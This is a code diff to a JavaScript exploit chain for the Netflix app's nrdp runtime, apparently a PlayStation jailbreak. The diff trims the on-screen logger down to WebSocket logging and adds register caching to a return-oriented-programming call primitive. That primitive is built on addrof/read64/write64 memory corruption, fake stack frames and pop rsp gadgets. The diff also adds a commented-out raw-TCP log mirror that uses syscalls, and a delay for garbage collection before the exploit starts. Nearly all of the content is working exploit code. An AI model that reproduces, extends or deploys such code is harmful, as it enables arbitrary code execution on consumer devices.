@@ -192,146 +192,13 @@ const ws = {
 // #endregion
 // #region Logger
 const logger = {
-    overlay: null,
-    lines: [],
-    widgets: [],
-    maxLines: 40,
-    refreshTimer: null,
-    pendingRefresh: false,
-    init() {
-        this.overlay = nrdp.gibbon.makeWidget();
-        this.overlay.color = { r: 0, g: 0, b: 0, a: 255 };
-        this.overlay.width = 1280;
-        this.overlay.height = 720;
-
-        nrdp.gibbon.scene.widget = this.overlay;
-
-        // Title widget - large red "Netflix N Hack" (centered)
-        var title = nrdp.gibbon.makeWidget({
-            name: "title",
-            x: 380,
-            y: 300,
-            width: 500,
-            height: 100
-        });
-        title.text = {
-            contents: "Netflix N Hack",
-            size: 72,
-            color: { a: 255, r: 255, g: 0, b: 0 },
-            wrap: false
-        };
-        title.parent = this.overlay;
-
-        // Subtitle widget - shown for PS4 (centered below title)
-        this.subtitle = nrdp.gibbon.makeWidget({
-            name: "subtitle",
-            x: 400,
-            y: 420,
-            width: 500,
-            height: 30
-        });
-        this.subtitle.text = {
-            contents: "",
-            size: 22,
-            color: { a: 255, r: 255, g: 100, b: 100 },
-            wrap: false
-        };
-        this.subtitle.parent = this.overlay;
-
-        // Pre-create all text widgets once to avoid removal/recreation overhead
-        for (var i = 0; i < this.maxLines; i++) {
-            var w = nrdp.gibbon.makeWidget({
-                name: "ln" + i,
-                x: 10,
-                y: 10 + (i * 17),
-                width: 1260,
-                height: 15
-            });
-
-            w.text = {
-                contents: "",
-                size: 12,
-                color: {
-                    a: 255,
-                    r: 0,
-                    g: 255,
-                    b: 0
-                },
-                wrap: false
-            };
-
-            w.parent = this.overlay;
-            this.widgets.push(w);
-        }
+    ts_start: null,
+    log(msg)         { ws.send((((Date.now() - this.ts_start) / 1000) | 0) + ' ' + msg); },
+    init()           {
+        this.ts_start = Date.now();
     },
-    log(msg) {
-        ws.send(msg);
-        this.lines.push(msg);
-        if (this.lines.length > this.maxLines) this.lines.shift();
-
-        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
-        this.refreshTimer = nrdp.setTimeout(() => {
-            this.refresh();
-            this.refreshTimer = null;
-        }, 200);
-
-        this.pendingRefresh = true;
-    },
-    refresh() {
-        if (!this.overlay) return;
-
-        // Update widget text content without recreating widgets
-        for (var i = 0; i < this.maxLines; i++) {
-            if (i < this.lines.length) {
-                this.widgets[i].text = {
-                    contents: this.lines[i],
-                    size: 12,
-                    color: {
-                        a: 255,
-                        r: 0,
-                        g: 255,
-                        b: 0
-                    },
-                    wrap: false
-                };
-            } else {
-                // Clear unused widget slots
-                this.widgets[i].text = {
-                    contents: "",
-                    size: 12,
-                    color: {
-                        a: 255,
-                        r: 0,
-                        g: 255,
-                        b: 0
-                    },
-                    wrap: false
-                };
-            }
-        }
-
-        this.pendingRefresh = false;
-    },
-    flush() {
-        // Force immediate refresh if needed (call before blocking operations)
-        if (this.refreshTimer) {
-            nrdp.clearTimeout(this.refreshTimer);
-            this.refreshTimer = null;
-        }
-        if (this.pendingRefresh) {
-            this.refresh();
-        }
-    },
-    setSubtitle(text) {
-        if (this.subtitle) {
-            this.subtitle.text = {
-                contents: text,
-                size: 20,
-                color: { a: 255, r: 255, g: 100, b: 100 },
-                wrap: false
-            };
-        }
-    }
+    flush()          {},
+    setSubtitle(text) {}
 }
 // #endregion
 // #region Pointer Helpers
@@ -511,7 +378,6 @@ class gadgets {
                         logger.flush();
                     }
                 });
-                logger.setSubtitle("PS4 Detected, Loading Exploit...");
                 is_ps4 = true;
                 return; // Exit constructor, main() will check is_ps4 and return
             default:
@@ -1140,12 +1006,37 @@ function main () {
         write64(fake_frame + 0x08n, g.get('pop_rsp')); // pop rsp ; ret --> this change the stack pointer to your stack
         write64(fake_frame + 0x10n, rop_address);
 
+        // Pre-computed constants and cache state for call_rop.
+        // Declared HERE (before call_rop) so the closure captures already-initialized
+        // bindings. Declaring let/const after a function declaration in the same block
+        // leaves them in the TDZ for the function-hoisted binding, causing ReferenceError.
+        const _cr_stack_offset    = 0x700000001n;
+        const _cr_rop_return_addr = base_heap_add + fake_rop_return;
+        const _cr_fake_frame_lo   = fake_frame & 0xffffffffn;
+        let _cr_cached_rbp    = null;
+        let _cr_rop_primed    = false;
+        let _cr_execute_primed = false;
+        let _cr_caching_active = false;
+        function _cr_reset_cache() { _cr_cached_rbp = null; _cr_rop_primed = false; _cr_execute_primed = false; }
+        function _cr_enable_caching()  { _cr_reset_cache(); _cr_caching_active = true; }
+        function _cr_disable_caching() { _cr_reset_cache(); _cr_caching_active = false; }
+
         // This function is calling a given function address and takes all arguments
         // Returns the value returned by the called function
         function call_rop (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
 
-            write64(add_rop_smash_code_store, 0xab0025n);
-            real_rbp = addrof(rop_smash(1)) + _cr_stack_offset;
+            if (_cr_caching_active) {
+                if (_cr_cached_rbp === null) {
+                    write64(add_rop_smash_code_store, 0xab0025n);
+                    _cr_cached_rbp = addrof(rop_smash(1)) + _cr_stack_offset;
+                    _cr_execute_primed = false;
+                }
+                real_rbp = _cr_cached_rbp;
+            } else {
+                write64(add_rop_smash_code_store, 0xab0025n);
+                real_rbp = addrof(rop_smash(1)) + _cr_stack_offset;
+                _cr_execute_primed = false;
+            }
 
             let i = 0;
 
@@ -1181,15 +1072,22 @@ function main () {
             fake_rop[i++] = g.get('pop_rsp_pop_rbp');
             fake_rop[i++] = real_rbp;
 
-            write64(add_rop_smash_code_store, 0xab00260325n);
-            fake_rw[59] = _cr_fake_frame_lo;
+            if (!_cr_execute_primed) {
+                write64(add_rop_smash_code_store, 0xab00260325n);
+                _cr_execute_primed = true;
+            }
+            // fake_rw[59] is clobbered by addrof() every time it runs (addrof sets
+            // fake_obj_arr[0] which overwrites the same heap slot). Must restore it
+            // after any addrof call. Non-caching: addrof runs every call → always
+            // restore. Caching: addrof only runs on the first call (_cr_cached_rbp
+            // null); after that it is skipped, so fake_rw[59] stays correct and the
+            // write can be skipped.
+            if (!_cr_caching_active || !_cr_rop_primed) {
+                fake_rw[59] = _cr_fake_frame_lo;
+                _cr_rop_primed = true;
+            }
             rop_smash(fake_obj_arr[0]);
         }
-
-        // Pre-computed constants for call_rop — avoids temp BigInt allocations on every call
-        const _cr_stack_offset    = 0x700000001n;  // 0x700000000n - 1n + 2n combined
-        const _cr_rop_return_addr = base_heap_add + fake_rop_return;
-        const _cr_fake_frame_lo   = fake_frame & 0xffffffffn;
 
         function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
@@ -1355,6 +1253,46 @@ function main () {
             }
             return sock;
         }
+
+        // Mirror logger.log to a raw TCP socket. WebSocket.send() is async — nrdp
+        // must run its event loop to flush the send buffer. main() never yields, so
+        // messages queued during ROP work are silently lost when the process crashes.
+        // A direct write() syscall lands in the kernel TCP send buffer synchronously
+        // and is delivered even if the process dies immediately after.
+        //
+        // The TCP path is gated on !_cr_caching_active: inside the feeding loop all
+        // call_rop invocations are at a fixed depth, and calling syscall() from inside
+        // logger.log() would be one frame deeper — wrong cached rbp → crash. During
+        // feeding, logger.log still delivers via WebSocket (best-effort).
+        // _tlog_fd/_tlog_view/_tlog_buf are intentionally NOT block-scoped so that
+        // p2jb.js (eval'd in this same scope) can write to the TCP log inline inside
+        // the feeding loop at the correct call depth (without going through logger.log
+        // which would add an extra frame and break the cached rbp).
+        // const _tlog_fd     = connectToServer(8089);
+        // const _tlog_maxlen = 256;
+        // const _tlog_ab     = new ArrayBuffer(_tlog_maxlen);
+        // const _tlog_view   = new Uint8Array(_tlog_ab);
+        // const _tlog_buf    = (() => { const a = addrof(_tlog_ab); return read64(a + 0x14n); })();
+        // {
+        //     const _tlog_orig = logger.log.bind(logger);
+        //     let   _tlog_on   = true;
+        //     logger.log = function(msg) {
+        //         _tlog_orig(msg);
+        //         if (!_tlog_on || _cr_caching_active) return;
+        //         try {
+        //             const line = String(msg) + '\n';
+        //             const len = Math.min(line.length, _tlog_maxlen);
+        //             for (let i = 0; i < len; i++) _tlog_view[i] = line.charCodeAt(i) & 0xFF;
+        //             let sent = 0;
+        //             while (sent < len) {
+        //                 const n = syscall(SYSCALL.write, _tlog_fd, _tlog_buf + BigInt(sent), BigInt(len - sent));
+        //                 const nv = Number(n); if (nv <= 0) break; sent += nv;
+        //             }
+        //         } catch(e) {}
+        //     };
+        //     logger.disable_tcp = function() { _tlog_on = false; };
+        // }
+        // logger.log("TCP log connected");
 
         function httpGet(sock, path) {
             const request = `GET ${path} HTTP/1.1\r\nHost: ${ip_script}\r\nConnection: close\r\n\r\n`;
@@ -1593,5 +1531,14 @@ function main () {
     }
 }
 
-ws.init(ip_script, 1337, () => { logger.log("\n\n\nWebsocket initiated successfully!"); main();});// uncomment this to enable WebSocket logging
-main();
+
+//const GC_SETTLE_MS = 1 * 60 * 1000; // 1 minute
+const GC_SETTLE_MS = 10 * 1000; // 10 second
+ws.init(ip_script, 1337, () => {
+    logger.log("\n\n\nWebsocket initiated successfully!");
+    logger.log("Waiting " + (GC_SETTLE_MS / 60000) + " min for compacting GC to fire before creating fragile structures...");
+    nrdp.setTimeout(() => {
+        logger.log("GC settle window done — starting exploit");
+        main();
+    }, GC_SETTLE_MS);
+});
